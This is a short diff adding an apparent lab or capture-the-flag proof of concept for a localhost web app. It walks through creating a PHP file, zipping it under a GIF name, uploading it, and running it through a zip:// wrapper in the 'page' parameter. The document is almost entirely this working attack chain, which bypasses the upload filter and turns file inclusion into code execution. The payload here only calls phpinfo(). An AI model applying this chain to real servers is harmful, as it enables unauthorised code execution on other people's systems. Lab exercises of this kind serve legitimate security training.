@@ -1,0 +1,7 @@
+[+] Create a file: s.php: <?php phpinfo(); ?>
+
+[+] linux: zip info.gif s.php
+
+[+] Access http://localhost:8081/?page=upload to upload file: info.gif
+
+[+] Access: http://localhost:8081/?page=zip://uploads/info.gif%23s to execute s.php in info.gif
